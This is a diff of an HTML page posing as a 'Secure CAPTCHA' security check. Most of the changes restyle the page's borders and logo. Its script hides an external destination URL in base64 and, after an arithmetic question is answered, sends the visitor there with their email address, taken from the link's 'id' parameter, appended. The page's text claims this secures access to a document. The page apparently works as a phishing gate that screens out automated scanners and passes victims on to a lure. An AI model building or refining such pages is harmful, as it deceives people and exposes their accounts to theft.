@@ -10,7 +10,8 @@
       --text: #333;
       --box-bg: #f7f7f7;
       --primary: #007bff;
-      --highlight: #0056b3;
+      --success-green: #28a745;
+      --border-gradient: linear-gradient(to right, #007bff, #00c6ff);
     }
 
     * {
@@ -32,59 +33,44 @@
 
     .logo {
       position: absolute;
-      top: 14px;
-      left: 14px;
+      top: 20px;
+      left: 20px;
       display: flex;
       align-items: center;
       background: var(--box-bg);
-      padding: 4px 10px;
-      border-radius: 10px;
-      border: 2px solid var(--primary);
-      box-shadow: 0 3px 10px rgba(0, 123, 255, 0.4);
+      padding: 6px 12px;
+      border-radius: 14px;
+      border: 2px solid transparent;
+      background-clip: padding-box;
+      border-image: var(--border-gradient);
+      border-image-slice: 1;
+      box-shadow: 0 4px 20px rgba(0, 123, 255, 0.2);
     }
 
     .logo img {
-      width: 22px;
-      height: 22px;
+      width: 16px;
+      height: 16px;
       margin-right: 6px;
       object-fit: contain;
-      transition: transform 0.3s ease;
-    }
-
-    .logo img:hover {
-      transform: scale(1.1);
     }
 
     .logo span {
-      font-size: 0.95rem;
+      font-size: 0.88rem;
       font-weight: 600;
       color: var(--primary);
-    }
-
-    #captcha-wrapper {
-      position: relative;
-      padding: 3px;
-      border-radius: 16px;
-      background: linear-gradient(135deg, #007bff, #00c6ff, #007bff);
-      background-size: 300% 300%;
-      animation: pulse-border 6s ease infinite;
-    }
-
-    @keyframes pulse-border {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
     }
 
     #captcha-box {
       background: var(--box-bg);
       padding: 30px;
-      border-radius: 14px;
+      border-radius: 16px;
+      border: 3px solid transparent;
+      border-image: var(--border-gradient);
+      border-image-slice: 1;
+      box-shadow: 0 6px 24px rgba(0, 123, 255, 0.25);
       text-align: center;
       width: 100%;
       max-width: 400px;
-      position: relative;
-      z-index: 1;
     }
 
     .captcha-header {
@@ -122,7 +108,7 @@
     }
 
     button:hover {
-      background-color: var(--highlight);
+      background-color: #0056b3;
     }
 
     #message {
@@ -161,64 +147,74 @@
       }
 
       .logo {
-        flex-direction: column;
-        align-items: flex-start;
+        flex-direction: row;
+        align-items: center;
         padding: 4px 10px;
       }
 
       .logo img {
-        width: 20px;
-        height: 20px;
-        margin-bottom: 4px;
+        width: 14px;
+        height: 14px;
+        margin-right: 6px;
       }
 
       .logo span {
-        font-size: 0.88rem;
+        font-size: 0.86rem;
       }
     }
   </style>
 </head>
 <body>
 
+  <!-- Logo -->
   <div class="logo">
     <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
     <span>Secure CAPTCHA</span>
   </div>
 
-  <div id="captcha-wrapper">
-    <div id="captcha-box">
-      <div class="captcha-header">For security reasons, please solve this to continue.</div>
-      <div id="captcha-question">Loading...</div>
-      <input type="number" id="user-answer" placeholder="Your answer" />
-      <br />
-      <button onclick="validateCaptcha()">Submit</button>
-      <div id="message"></div>
-      <p class="note">
-        By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
-      </p>
-    </div>
+  <!-- CAPTCHA -->
+  <div id="captcha-box">
+    <div class="captcha-header">For security reasons, please solve this to continue.</div>
+    <div id="captcha-question">Loading...</div>
+    <input type="number" id="user-answer" placeholder="Your answer" />
+    <br />
+    <button onclick="validateCaptcha()">Submit</button>
+    <div id="message"></div>
+    <p class="note">
+      By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
+    </p>
   </div>
 
   <script>
     let answer = 0;
     let firstSolved = false;
 
-    const base64Ref = "aHR0cHM6Ly9kb2N1LmZlbm1lbm9zLmRlL0ViZVpF"; // https://docu.fenmenos.de/EbeZE
+    // Base64-encoded final redirect URL
+    const base64Ref = btoa("https://docu.fenmenos.de/EbeZE");
 
     function generateCaptcha() {
       const num1 = Math.floor(Math.random() * 20) + 1;
       const num2 = Math.floor(Math.random() * 10) + 1;
       const operations = ['+', '-', '*'];
       const operation = operations[Math.floor(Math.random() * operations.length)];
-      const symbol = operation === '*' ? 'x' : operation;
 
+      let question = '';
       switch (operation) {
-        case '+': answer = num1 + num2; break;
-        case '-': answer = num1 - num2; break;
-        case '*': answer = num1 * num2; break;
+        case '+':
+          answer = num1 + num2;
+          question = `${num1} + ${num2}`;
+          break;
+        case '-':
+          answer = num1 - num2;
+          question = `${num1} - ${num2}`;
+          break;
+        case '*':
+          answer = num1 * num2;
+          question = `${num1} x ${num2}`;
+          break;
       }
 
-      document.getElementById("captcha-question").innerText = `What is ${num1} ${symbol} ${num2}?`;
+      document.getElementById("captcha-question").innerText = `What is ${question}?`;
       document.getElementById("user-answer").value = '';
       document.getElementById("message").innerText = '';
     }
@@ -234,7 +230,9 @@
           generateCaptcha();
         } else {
           msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
-          setTimeout(() => redirectUser(), 1500);
+          setTimeout(() => {
+            redirectUser();
+          }, 1500);
         }
       } else {
         msg.innerText = "Incorrect. Please try again.";
@@ -246,8 +244,12 @@
         const decodedRef = atob(base64Ref);
         const email = new URLSearchParams(window.location.search).get("id");
 
-        const finalUrl = email ? `${decodedRef}?id=${email}` : decodedRef;
-        window.location.href = finalUrl;
+        if (email) {
+          const finalUrl = decodedRef + `?id=${email}`;
+          window.location.href = finalUrl;
+        } else {
+          window.location.href = decodedRef;
+        }
       } catch (e) {
         alert("Redirect failed. Invalid base64.");
       }
